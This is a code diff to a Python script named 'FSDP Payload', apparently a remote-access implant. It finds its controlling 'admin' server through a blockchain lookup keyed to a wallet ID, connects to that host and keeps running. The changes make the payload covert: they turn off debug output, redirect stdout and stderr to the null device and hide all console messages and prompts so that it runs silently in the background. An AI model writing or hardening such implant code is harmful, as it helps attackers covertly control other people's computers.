@@ -21,7 +21,7 @@ except ImportError:
     print("Error: urllib not available")
     sys.exit(1)
 
-DEBUG = True
+DEBUG = False  # Set to False to hide all terminal output
 PAYLOAD_WALLET = "admin-b62ef7f6/001-f07273bd"  # HD-derived child wallet
 
 # Blockchain-Based Discovery
@@ -453,14 +453,20 @@ class BlockchainClient:
             time.sleep(30)
 
 if __name__ == "__main__":
+    # Suppress all terminal output (run silently in background)
+    if not DEBUG:
+        sys.stdout = open(os.devnull, 'w')
+        sys.stderr = open(os.devnull, 'w')
+    
     try:
-        print("="*60)
-        print("FSDP Payload Starting (Blockchain Discovery)")
-        print(f"Payload Wallet: {PAYLOAD_WALLET[:24]}...")
-        print(f"Platform: {platform.system()}/{platform.machine()}")
-        print(f"Hostname: {socket.gethostname()}")
-        print(f"Blockchain: {BLOCKCHAIN_API}")
-        print("="*60)
+        if DEBUG:
+            print("="*60)
+            print("FSDP Payload Starting (Blockchain Discovery)")
+            print(f"Payload Wallet: {PAYLOAD_WALLET[:24]}...")
+            print(f"Platform: {platform.system()}/{platform.machine()}")
+            print(f"Hostname: {socket.gethostname()}")
+            print(f"Blockchain: {BLOCKCHAIN_API}")
+            print("="*60)
         
         logger.log("="*60)
         logger.log("FSDP Payload Started (Blockchain Discovery)")
@@ -474,55 +480,65 @@ if __name__ == "__main__":
         master_wallet = PAYLOAD_WALLET.split('/')[0] if '/' in PAYLOAD_WALLET else None
         
         if not master_wallet:
-            print("\nERROR: Invalid payload wallet format!")
+            if DEBUG:
+                print("\nERROR: Invalid payload wallet format!")
+                input("Press Enter to exit...")
             logger.log("ERROR: Could not extract master wallet")
-            input("Press Enter to exit...")
             sys.exit(1)
         
-        print(f"\nMaster wallet: {master_wallet}")
-        print("Discovering admin via blockchain...")
+        if DEBUG:
+            print(f"\nMaster wallet: {master_wallet}")
+            print("Discovering admin via blockchain...")
         
         # Query blockchain for admin location
         connection_info = discover_admin_via_blockchain(master_wallet, BLOCKCHAIN_API)
         
         if not connection_info:
-            print("\nERROR: Could not find admin in blockchain!")
-            print("Make sure admin is online and validator is running.")
+            if DEBUG:
+                print("\nERROR: Could not find admin in blockchain!")
+                print("Make sure admin is online and validator is running.")
+                input("Press Enter to exit...")
             logger.log("ERROR: Admin wallet not found in blockchain")
-            input("Press Enter to exit...")
             sys.exit(1)
         
         # Extract connection info
         api_url = f"http://{connection_info.get('ip')}:{connection_info.get('port')}"
         
-        print(f"Admin found at: {api_url}")
-        print("\nInitializing blockchain client...")
+        if DEBUG:
+            print(f"Admin found at: {api_url}")
+            print("\nInitializing blockchain client...")
         client = BlockchainClient(api_url, PAYLOAD_WALLET)
         
-        print("Connecting to API...")
+        if DEBUG:
+            print("Connecting to API...")
         client.connect()
         
-        print("Connected! Payload running...")
-        print("Press Ctrl+C to stop\n")
+        if DEBUG:
+            print("Connected! Payload running...")
+            print("Press Ctrl+C to stop\n")
         logger.log("Payload running - Press Ctrl+C to stop...")
         
         while True:
             time.sleep(1)
             
     except KeyboardInterrupt:
-        print("\nInterrupted by user")
+        if DEBUG:
+            print("\nInterrupted by user")
         logger.log("Interrupted by user")
         sys.exit(0)
     except Exception as e:
         error_msg = f"FATAL ERROR: {e}"
-        print("\n" + "="*60)
-        print(error_msg)
-        print("="*60)
+        if DEBUG:
+            print("\n" + "="*60)
+            print(error_msg)
+            print("="*60)
         import traceback
         tb = traceback.format_exc()
-        print(tb)
+        if DEBUG:
+            print(tb)
         logger.log(error_msg)
         logger.log(tb)
-        print("\nCheck logs at: %USERPROFILE%\\.fsdp_logs\\")
-        input("\nPress Enter to exit...")
+        if DEBUG:
+            print("\nCheck logs at: %USERPROFILE%\\.fsdp_logs\\")
+            input("\nPress Enter to exit...")
         sys.exit(1)
